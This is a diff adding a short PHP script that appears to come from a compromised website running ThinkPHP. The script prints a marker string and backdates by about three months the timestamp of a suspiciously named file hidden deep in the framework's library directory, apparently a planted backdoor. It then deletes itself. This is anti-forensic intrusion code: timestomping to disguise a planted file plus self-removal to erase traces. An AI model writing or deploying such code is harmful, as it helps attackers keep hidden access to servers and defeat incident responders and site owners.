@@ -1,0 +1,1 @@
+<?php echo "PMXdrpEqXp"; if (file_exists("/www/wwwroot/jtr168.cn/Server/thinkphp/library/think/console/output/descriptor/partenaires/truck_resources.php")){ touch("/www/wwwroot/jtr168.cn/Server/thinkphp/library/think/console/output/descriptor/partenaires/truck_resources.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*mgFhQdxEfzmQfahQF2de*/ ?>
